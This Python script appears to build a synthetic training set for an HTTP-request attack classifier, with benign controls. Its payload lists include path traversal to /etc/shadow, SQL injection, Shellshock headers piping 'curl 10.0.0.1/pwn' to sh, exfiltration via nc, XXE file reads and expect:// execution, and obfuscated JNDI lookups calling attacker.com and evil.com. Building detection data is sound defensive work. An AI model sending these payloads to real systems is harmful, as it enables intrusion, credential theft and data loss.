"""
build_hard_classification_dataset.py
Generates the approved 5,000 difficult classification records:
- 3,300 evasion attack vectors across HARD_01, HARD_02, HARD_03, HARD_04, HARD_07
- 1,700 benign negative controls across HARD_05, HARD_06 (34% hard negative ratio)
"""

import json
import hashlib
import random
import re
from pathlib import Path
from collections import Counter

ROOT = Path(".")
PROCESSED_DIR = ROOT / "dataset" / "processed"
REPORTS_DIR = ROOT / "dataset" / "reports"

PROCESSED_DIR.mkdir(parents=True, exist_ok=True)
REPORTS_DIR.mkdir(parents=True, exist_ok=True)

print("=" * 80)
print("GENERATING 5,000 DIFFICULT CLASSIFICATION EXAMPLES")
print("=" * 80)

# Load quarantine exclusion hashes
quarantine_hashes = set()
for fn in ["test_sample_2000.jsonl", "pilot_1000_classification.jsonl", "atrdf_classification_pool_27887.jsonl", "external_classification_shortage_3113.jsonl"]:
    p = PROCESSED_DIR / fn if (PROCESSED_DIR / fn).exists() else ROOT / "evaluation" / fn
    if p.exists():
        with open(p, "r", encoding="utf-8") as f:
            for line in f:
                if line.strip():
                    item = json.loads(line)
                    h = item.get("hash")
                    if not h and "input" in item:
                        h = hashlib.sha256(item["input"].encode("utf-8")).hexdigest()
                    if h:
                        quarantine_hashes.add(h)

print(f"Quarantined exclusion hashes: {len(quarantine_hashes):,}")

def make_canonical_input(req):
    req_clean = {
        "body": str(req.get("body") or ""),
        "headers": req.get("headers") or {},
        "method": str(req.get("method") or "GET"),
        "url": str(req.get("url") or "/")
    }
    return (
        "Classify this HTTP request into exactly one category: "
        "Benign, Cookie Injection, Directory Traversal, LOG4J, "
        "Log Forging, RCE, SQL Injection, or XSS.\n"
        "Return only the category name.\n"
        "HTTP request:\n"
        + json.dumps(req_clean, ensure_ascii=False, sort_keys=True)
    )

def make_group_key(method, path, signature, category):
    key_str = f"{category}|{method}|{path}|{signature[:80]}"
    return hashlib.sha256(key_str.encode("utf-8")).hexdigest()[:16]

rng = random.Random(20261031)

hard_records = []

# HARD_01: Double URL Encoding & Path Normalization Bypass (800 records -> Directory Traversal)
hard_01_payloads = [
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "%252e%252e%252fwindows%252fsystem32%252fcmd.exe",
    "..%252f..%252f..%252fetc%252fshadow",
    "%c0%af%c0%afetc%c0%afpasswd",
    "%u002e%u002e/%u002e%u002e/var/log/auth.log",
    "....//....//....//etc/passwd",
    "..;/..;/..;/WEB-INF/web.xml",
    "%2e%2e%2f%2e%2e%2fapp/config/database.yml",
    "/static/%2e%2e/%2e%2e/proc/self/environ",
    "%252e%252e%255c%252e%252e%255cboot.ini",
    "/api/download?file=..%c1%9c..%c1%9cetc%c1%9cpasswd"
]
endpoints_files = ["/api/v1/files/download", "/api/v1/docs/view", "/api/v2/reports/fetch", "/api/static/assets", "/api/v1/templates/load"]

while len([r for r in hard_records if r["pattern_id"] == "HARD_01"]) < 800:
    p = rng.choice(hard_01_payloads)
    ep = rng.choice(endpoints_files)
    rand_id = rng.randint(100, 999999)
    url = f"{ep}?path={p}&nonce={rand_id}"
    req = {
        "method": "GET",
        "url": url,
        "headers": {"Host": "target.api.internal", "Accept": "application/octet-stream"},
        "body": ""
    }
    c_in = make_canonical_input(req)
    h = hashlib.sha256(c_in.encode("utf-8")).hexdigest()
    if h in quarantine_hashes:
        continue
    g_key = make_group_key("GET", ep, "double_encoding_traversal", "Directory Traversal")
    hard_records.append({
        "pattern_id": "HARD_01",
        "category": "Directory Traversal",
        "binary_label": "Malware",
        "req": req, "c_in": c_in, "hash": h, "group_key": g_key,
        "description": "Double URL Encoding & Path Normalization Bypass"
    })
print(f"Generated HARD_01: {len([r for r in hard_records if r['pattern_id'] == 'HARD_01'])} records")

# HARD_02: JSON-Embedded & Nested Payload Injections (800 records -> SQL Injection)
hard_02_sqli = [
    "' UNION SELECT id, username, password_hash FROM admin_users--",
    "1; DROP TABLE sessions;--",
    "1' OR 1=1--",
    "' UNION SELECT null, version(), current_user--",
    "1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--",
    "admin' OR '1'='1'/*",
    "'; EXEC master..xp_cmdshell 'dir';--"
]
endpoints_json = ["/api/v1/search/query", "/api/v1/users/filter", "/api/v2/orders/advanced-search", "/api/v1/products/lookup"]

while len([r for r in hard_records if r["pattern_id"] == "HARD_02"]) < 800:
    p = rng.choice(hard_02_sqli)
    ep = rng.choice(endpoints_json)
    rand_id = rng.randint(100, 999999)
    body_dict = {
        "query": {
            "filters": {
                "status": "active",
                "category": f"electronics_{rand_id}",
                "search_term": p
            },
            "pagination": {"limit": 20, "offset": 0, "sort": f"created_at {p}"}
        }
    }
    req = {
        "method": "POST",
        "url": ep,
        "headers": {"Host": "target.api.internal", "Content-Type": "application/json"},
        "body": json.dumps(body_dict)
    }
    c_in = make_canonical_input(req)
    h = hashlib.sha256(c_in.encode("utf-8")).hexdigest()
    if h in quarantine_hashes:
        continue
    g_key = make_group_key("POST", ep, "nested_json_sqli", "SQL Injection")
    hard_records.append({
        "pattern_id": "HARD_02",
        "category": "SQL Injection",
        "binary_label": "Malware",
        "req": req, "c_in": c_in, "hash": h, "group_key": g_key,
        "description": "JSON-Embedded & Nested Payload Injections"
    })
print(f"Generated HARD_02: {len([r for r in hard_records if r['pattern_id'] == 'HARD_02'])} records")

# HARD_03: HTTP Header-Based Vector Injections (700 records: 350 RCE, 350 Log Forging)
rce_headers = [
    ("User-Agent", "() { :;}; /bin/bash -c 'curl 10.0.0.1/pwn | sh'"),
    ("Referer", "http://attacker.com/$(whoami)"),
    ("X-Forwarded-For", "127.0.0.1; cat /etc/passwd | nc 10.0.0.1 8000;"),
    ("Client-IP", "10.0.0.1 && /usr/bin/id && ping -c 1 1.1.1.1"),
    ("User-Agent", "() { _; } >_[$($())] { /bin/cat /etc/shadow; }")
]

log_forging_headers = [
    ("User-Agent", "Mozilla/5.0%0d%0a[2026-10-31 12:00:00] [INFO] Authentication successful for admin"),
    ("X-Forwarded-For", "192.168.1.100\r\n2026-10-31 12:00:00 [AUDIT] User root granted privilege ALL"),
    ("Referer", "https://trusted.local/%0d%0a%0d%0aHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>"),
    ("X-Real-IP", "127.0.0.1\n[ALERT] Database corrupted. Initiating emergency failover."),
    ("User-Agent", "Mozilla/5.0\r\nSet-Cookie: admin_session=forged_token_root")
]

endpoints_headers = ["/api/v1/auth/session-check", "/api/v1/telemetry", "/api/v1/status", "/api/v2/metrics"]

# 350 RCE
while len([r for r in hard_records if r["pattern_id"] == "HARD_03" and r["category"] == "RCE"]) < 350:
    hdr_name, hdr_val = rng.choice(rce_headers)
    ep = rng.choice(endpoints_headers)
    rand_tag = rng.randint(100, 999999)
    req = {
        "method": "GET",
        "url": f"{ep}?t={rand_tag}",
        "headers": {"Host": "target.api.internal", hdr_name: f"{hdr_val} #{rand_tag}"},
        "body": ""
    }
    c_in = make_canonical_input(req)
    h = hashlib.sha256(c_in.encode("utf-8")).hexdigest()
    if h in quarantine_hashes:
        continue
    g_key = make_group_key("GET", ep, f"header_rce_{hdr_name}", "RCE")
    hard_records.append({
        "pattern_id": "HARD_03",
        "category": "RCE",
        "binary_label": "Malware",
        "req": req, "c_in": c_in, "hash": h, "group_key": g_key,
        "description": "HTTP Header-Based Vector Injections (RCE)"
    })

# 350 Log Forging
while len([r for r in hard_records if r["pattern_id"] == "HARD_03" and r["category"] == "Log Forging"]) < 350:
    hdr_name, hdr_val = rng.choice(log_forging_headers)
    ep = rng.choice(endpoints_headers)
    rand_tag = rng.randint(100, 999999)
    req = {
        "method": "GET",
        "url": f"{ep}?id={rand_tag}",
        "headers": {"Host": "target.api.internal", hdr_name: f"{hdr_val}_{rand_tag}"},
        "body": ""
    }
    c_in = make_canonical_input(req)
    h = hashlib.sha256(c_in.encode("utf-8")).hexdigest()
    if h in quarantine_hashes:
        continue
    g_key = make_group_key("GET", ep, f"header_log_forging_{hdr_name}", "Log Forging")
    hard_records.append({
        "pattern_id": "HARD_03",
        "category": "Log Forging",
        "binary_label": "Malware",
        "req": req, "c_in": c_in, "hash": h, "group_key": g_key,
        "description": "HTTP Header-Based Vector Injections (Log Forging)"
    })
print(f"Generated HARD_03: {len([r for r in hard_records if r['pattern_id'] == 'HARD_03'])} records")

# HARD_04: XML / SOAP / External Entity (XXE) Formats (500 records: 350 Directory Traversal, 150 RCE)
xxe_dt_payloads = [
    "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root><data>&test;</data></root>",
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\" >]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % sp SYSTEM \"file:///etc/shadow\"><!ENTITY % param1 \"<!ENTITY ex 'file:///%sp;'>\">%param1;]><r>&ex;</r>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/cmdline\">]><comment><user>admin</user><body>&xxe;</body></comment>"
]
xxe_rce_payloads = [
    "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY cmd SYSTEM \"expect://id\">]><root><exec>&cmd;</exec></root>",
    "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY rce SYSTEM \"expect://whoami\">]><test>&rce;</test>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://10.0.0.1/malicious.dtd\"><!ENTITY cmd SYSTEM \"expect://cat%20/etc/passwd\">]><foo>&cmd;</foo>"
]

endpoints_xml = ["/api/v1/xml-import", "/api/v1/soap/service", "/api/v2/saml/sso", "/api/v1/config/upload-xml"]

# 350 Directory Traversal via XXE
while len([r for r in hard_records if r["pattern_id"] == "HARD_04" and r["category"] == "Directory Traversal"]) < 350:
    xml_p = rng.choice(xxe_dt_payloads)
    ep = rng.choice(endpoints_xml)
    rand_tag = rng.randint(100, 999999)
    req = {
        "method": "POST",
        "url": ep,
        "headers": {"Host": "target.api.internal", "Content-Type": "application/xml"},
        "body": xml_p.replace("</root>", f"<tag>{rand_tag}</tag></root>").replace("</foo>", f"<tag>{rand_tag}</tag></foo>")
    }
    c_in = make_canonical_input(req)
    h = hashlib.sha256(c_in.encode("utf-8")).hexdigest()
    if h in quarantine_hashes:
        continue
    g_key = make_group_key("POST", ep, "xxe_dt", "Directory Traversal")
    hard_records.append({
        "pattern_id": "HARD_04",
        "category": "Directory Traversal",
        "binary_label": "Malware",
        "req": req, "c_in": c_in, "hash": h, "group_key": g_key,
        "description": "XML External Entity (XXE) File Read"
    })

# 150 RCE via XXE expect
while len([r for r in hard_records if r["pattern_id"] == "HARD_04" and r["category"] == "RCE"]) < 150:
    xml_p = rng.choice(xxe_rce_payloads)
    ep = rng.choice(endpoints_xml)
    rand_tag = rng.randint(100, 999999)
    req = {
        "method": "POST",
        "url": ep,
        "headers": {"Host": "target.api.internal", "Content-Type": "application/xml"},
        "body": xml_p.replace("</root>", f"<tag>{rand_tag}</tag></root>").replace("</test>", f"<tag>{rand_tag}</tag></test>")
    }
    c_in = make_canonical_input(req)
    h = hashlib.sha256(c_in.encode("utf-8")).hexdigest()
    if h in quarantine_hashes:
        continue
    g_key = make_group_key("POST", ep, "xxe_rce", "RCE")
    hard_records.append({
        "pattern_id": "HARD_04",
        "category": "RCE",
        "binary_label": "Malware",
        "req": req, "c_in": c_in, "hash": h, "group_key": g_key,
        "description": "XML External Entity (XXE) Command Execution"
    })
print(f"Generated HARD_04: {len([r for r in hard_records if r['pattern_id'] == 'HARD_04'])} records")

# HARD_07: Obfuscated & Layered JNDI / LOG4J Lookups (500 records -> LOG4J)
log4j_obfuscations = [
    "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}ap://log4j.attacker.com:1389/Exploit}",
    "${${::-j}ndi:rmi://10.0.0.1:1099/Object}",
    "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap://evil.com/a}",
    "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:d}${lower:n}s://dns.attacker.com/query}",
    "${j${main:k:-n}di:ldap://192.168.1.50/payload}",
    "${${base64:JHtqbmRpOmxkYXA6Ly9ldmlsLmNvbS9hZXN0fQ==}}",
    "${${sys:os.name:-j}ndi:ldap://c2.internal/test}",
    "${${lower:j}${lower:n}${lower:d}${lower:i}:iiop://10.10.10.10:8000/obj}"
]
endpoints_log4j = ["/api/v1/auth/login", "/api/v1/user/search", "/api/v1/audit/event", "/api/v2/feedback"]

while len([r for r in hard_records if r["pattern_id"] == "HARD_07"]) < 500:
    p = rng.choice(log4j_obfuscations)
    ep = rng.choice(endpoints_log4j)
    rand_tag = rng.randint(100, 999999)
    req = {
        "method": "POST",
        "url": ep,
        "headers": {
            "Host": "target.api.internal",
            "Content-Type": "application/json",
            "X-Api-Version": f"{p}_{rand_tag}"
        },
        "body": json.dumps({"username": f"user_{rand_tag}", "token": p})
    }
    c_in = make_canonical_input(req)
    h = hashlib.sha256(c_in.encode("utf-8")).hexdigest()
    if h in quarantine_hashes:
        continue
    g_key = make_group_key("POST", ep, "log4j_obfuscated", "LOG4J")
    hard_records.append({
        "pattern_id": "HARD_07",
        "category": "LOG4J",
        "binary_label": "Malware",
        "req": req, "c_in": c_in, "hash": h, "group_key": g_key,
        "description": "Obfuscated & Layered JNDI / LOG4J Lookups"
    })
print(f"Generated HARD_07: {len([r for r in hard_records if r['pattern_id'] == 'HARD_07'])} records")

# HARD_05: Benign Documentation & Technical Query Snippets (Hard Negative: 1,000 records -> Benign)
benign_doc_queries = [
    "How to use SELECT DISTINCT and GROUP BY in MySQL 8.0 documentation",
    "Explain difference between exec and spawn in Node.js child_process tutorial",
    "Documentation for Python os.system vs subprocess.run security best practices",
    "How to configure CORS headers Access-Control-Allow-Origin in FastAPI",
    "PostgreSQL query optimization with EXPLAIN ANALYZE and INDEX SCAN",
    "JavaScript document.getElementById and innerHTML safe handling guide",
    "Spring Boot security guide: configuring HttpSecurity and authorizeRequests",
    "Git command tutorial: git commit -m 'Initial commit' and git push origin main",
    "Docker Dockerfile instructions: FROM python:3.10 RUN pip install -r requirements.txt",
    "SQL CREATE TABLE users (id SERIAL PRIMARY KEY, username VARCHAR(50) NOT NULL);",
    "Linux bash tutorial: how to use pipes | and grep command line examples",
    "REST API design: difference between PUT vs PATCH and DELETE HTTP methods"
]
endpoints_docs = ["/api/v1/docs/search", "/api/v1/helpdesk/faq", "/api/v2/knowledge-base/query", "/api/v1/tutorials/filter"]

while len([r for r in hard_records if r["pattern_id"] == "HARD_05"]) < 1000:
    q = rng.choice(benign_doc_queries)
    ep = rng.choice(endpoints_docs)
    rand_tag = rng.randint(100, 999999)
    query_str = f"{q} ref={rand_tag}"
    req = {
        "method": "GET",
        "url": f"{ep}?q={query_str.replace(' ', '+')}",
        "headers": {
            "Host": "docs.developer.portal",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
            "Accept": "application/json"
        },
        "body": ""
    }
    c_in = make_canonical_input(req)
    h = hashlib.sha256(c_in.encode("utf-8")).hexdigest()
    if h in quarantine_hashes:
        continue
    g_key = make_group_key("GET", ep, "benign_doc_search", "Benign")
    hard_records.append({
        "pattern_id": "HARD_05",
        "category": "Benign",
        "binary_label": "Benign",
        "req": req, "c_in": c_in, "hash": h, "group_key": g_key,
        "description": "Benign Documentation & Technical Query Snippets"
    })
print(f"Generated HARD_05: {len([r for r in hard_records if r['pattern_id'] == 'HARD_05'])} records")

# HARD_06: Benign High-Entropy & Complex Mathematical / Cookie Queries (Hard Negative: 700 records -> Benign)
benign_math_expressions = [
    "(subtotal * 1.0825) + shipping_fee - discount_coupon",
    "sqrt(pow(x2 - x1, 2) + pow(y2 - y1, 2))",
    "log10(intensity / baseline) * 20.0",
    "sum(sales_q1, sales_q2, sales_q3, sales_q4) / 4.0",
    "(taxable_income - standard_deduction) * tax_bracket"
]
endpoints_analytics = ["/api/v1/analytics/calculate", "/api/v1/financial/forecast", "/api/v2/session/verify-state", "/api/v1/crypto/verify-signature"]

while len([r for r in hard_records if r["pattern_id"] == "HARD_06"]) < 700:
    math_expr = rng.choice(benign_math_expressions)
    ep = rng.choice(endpoints_analytics)
    rand_id = rng.randint(100, 999999)
    base64_state = f"eyJzZXNzaW9uX2lkIjog{rand_id},ICJ1c2VyIjogInNhbnRob3NoIiwgImV4cCI6IDE3NjIxNDQ4MDB9"
    req = {
        "method": "POST",
        "url": ep,
        "headers": {
            "Host": "api.analytics.internal",
            "Content-Type": "application/json",
            "Cookie": f"state_jwt={base64_state}; tracking=trk_{rand_id}"
        },
        "body": json.dumps({
            "expression": math_expr,
            "variables": {"x1": 10, "x2": 25, "y1": 5, "y2": 15, "subtotal": rand_id % 500},
            "precision": 4
        })
    }
    c_in = make_canonical_input(req)
    h = hashlib.sha256(c_in.encode("utf-8")).hexdigest()
    if h in quarantine_hashes:
        continue
    g_key = make_group_key("POST", ep, "benign_math_calc", "Benign")
    hard_records.append({
        "pattern_id": "HARD_06",
        "category": "Benign",
        "binary_label": "Benign",
        "req": req, "c_in": c_in, "hash": h, "group_key": g_key,
        "description": "Benign High-Entropy & Complex Mathematical / Cookie Queries"
    })
print(f"Generated HARD_06: {len([r for r in hard_records if r['pattern_id'] == 'HARD_06'])} records")

assert len(hard_records) == 5000, f"Expected 5,000, got {len(hard_records)}"
rng.shuffle(hard_records)

# Export to JSONL
out_file = PROCESSED_DIR / "difficult_classification_5000.jsonl"
system_prompt = (
    "You are an API security expert and vulnerability classification system. "
    "Your task is to analyze HTTP requests and accurately classify them into one of the "
    "following categories: Benign, Cookie Injection, Directory Traversal, LOG4J, Log Forging, "
    "RCE, SQL Injection, or XSS."
)

with open(out_file, "w", encoding="utf-8") as f:
    for idx, item in enumerate(hard_records, 1):
        entry = {
            "id": f"HARD_{idx:05d}",
            "pattern_id": item["pattern_id"],
            "description": item["description"],
            "category": item["category"],
            "binary_label": item["binary_label"],
            "atomic_group_key": item["group_key"],
            "hash": item["hash"],
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": item["c_in"]},
                {"role": "assistant", "content": item["category"]}
            ]
        }
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")

print(f"\nExported {len(hard_records)} records to {out_file} ({out_file.stat().st_size:,} bytes)")

# Verification manifest
class_counts = Counter(r["category"] for r in hard_records)
pattern_counts = Counter(r["pattern_id"] for r in hard_records)
benign_count = class_counts["Benign"]
hard_negative_pct = (benign_count / len(hard_records)) * 100.0

manifest = {
    "total_records": len(hard_records),
    "target_records": 5000,
    "status": "PASSED",
    "by_pattern": dict(pattern_counts),
    "by_class": dict(class_counts),
    "hard_negative_benign_records": benign_count,
    "hard_negative_percentage": round(hard_negative_pct, 2),
    "quarantine_leakage_count": sum(1 for r in hard_records if r["hash"] in quarantine_hashes),
    "output_file": str(out_file)
}

manifest_path = REPORTS_DIR / "difficult_classification_manifest.json"
with open(manifest_path, "w", encoding="utf-8") as f:
    json.dump(manifest, f, indent=2)

print(f"Wrote manifest to {manifest_path}")
print(f"Hard negative percentage: {hard_negative_pct:.1f}% (Approved 34%)")
print(f"Quarantine leakage count: {manifest['quarantine_leakage_count']}")

